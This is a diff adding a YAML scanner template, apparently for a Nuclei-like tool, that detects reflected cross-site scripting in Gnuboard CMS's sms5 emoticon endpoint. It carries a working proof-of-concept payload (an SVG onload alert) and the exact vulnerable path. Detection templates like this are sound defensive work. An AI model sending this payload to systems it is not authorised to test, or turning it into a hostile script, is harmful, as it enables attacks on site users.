@@ -1,0 +1,31 @@
+id: "gnuboard-sms-xss"
+name: "Gnuboard CMS - Cross-Site Scripting"
+severity: "medium"
+description: "Gnuboard CMS contains a cross-site scripting vulnerability which allows remote attackers to inject arbitrary JavaScript into the responses returned by the server."
+tech:
+  - "php"
+tags:
+  - "xss"
+  - "gnuboard"
+  - "vuln"
+reference: "https://sir.kr/g5_pds/4788?page=5"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/plugin/sms5/ajax.sms_emoticon.php?arr_ajax_msg=gnuboard<svg+onload=alert(document.domain)>"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "word"
+    part: "body"
+    words:
+      - "\"0nuboard<svg onload=alert(document.domain)>\""
+  - type: "word"
+    part: "header"
+    words:
+      - "text/html"
+  - type: "status"
+    status:
+      - 200
